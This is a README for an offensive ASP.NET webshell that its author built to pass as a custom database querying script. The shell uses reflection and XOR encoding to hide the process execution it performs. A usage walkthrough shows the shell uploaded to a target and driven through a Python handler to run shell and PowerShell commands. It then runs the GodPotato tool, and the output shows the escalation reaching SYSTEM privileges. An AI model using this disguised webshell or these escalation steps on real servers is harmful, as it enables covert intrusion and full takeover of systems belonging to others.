## What is this

And old project I made ages ago in an attempt to obscure my ASP.NET webshell efforts, intends to present itself as a custom database querying script.

The ASPX component makes use of reflective methods and xor encoding to load an instance of System.Diagnostics.Process and ProcessStartInfo to execute binaries or shell commands.
The script is far from in a perfect state + I can't be bothered to update and tidy it.

<u><b>NOTE:</b></u> Not OPSEC safe - this is far from perfect :)

## ASPX WebShell Usage

First find a means to upload your webshell - hacktheplanet or something.

```
https://example.local/docs/uploads/2025/upld.aspx
```

Then make use of the handler script to modify the binary being executed and what arguments are being passed to it.

```bash
-$ python3 webshell-handler -u https://example.local/docs/uploads/2025/upld.aspx

CMD> whoami

IIS AppPool\DefaultAppPool

CMD> PWSH 

PWSH> Get-Process

[SNIP]

PWSH> CUSTOM C:\Temp\GodPotato.exe

GodPotato.exe> -cmd "cmd /c whoami"

[SNIP]
nt authority\system
```
